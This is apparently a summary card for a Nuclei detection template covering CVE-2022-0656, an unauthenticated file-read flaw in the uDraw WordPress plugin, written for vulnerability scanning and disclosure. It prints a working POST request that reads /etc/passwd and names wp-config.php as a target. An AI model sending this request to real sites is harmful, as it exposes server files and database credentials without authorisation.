---
cve_id: CVE-2022-0656
template_path: nuclei-templates/http/cves/2022/CVE-2022-0656.yaml
affected_product: uDraw
severity: high
authentication: none
external_callback: false
affected_versions: <3.3.3
preconditions: []
poc_classification: info-leak
---

## Vulnerability

uDraw (WordPress plugin) versions prior to 3.3.3 do not validate the `url` parameter in the `udraw_convert_url_to_base64` AJAX action. This action, accessible to both unauthenticated and authenticated users, passes the parameter directly to `file_get_contents()` and returns the base64-encoded file content.

Unauthenticated attackers can therefore perform local file inclusion to read arbitrary files on the server (e.g., `/etc/passwd`, `wp-config.php` containing database credentials).

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)  
CWE-552

## PoC / Detection

Classification: info-leak

The template sends the following POST request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=udraw_convert_url_to_base64&url=/etc/passwd
```

It matches on status code 200 and the response body containing both `cm9vd` (base64 for "root") and `data:image/;base64` to confirm successful file read and encoding.

## References

- https://wpscan.com/vulnerability/925c4c28-ae94-4684-a365-5f1e34e6c151
- https://nvd.nist.gov/vuln/detail/CVE-2022-0656
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/cyllective/CVEs
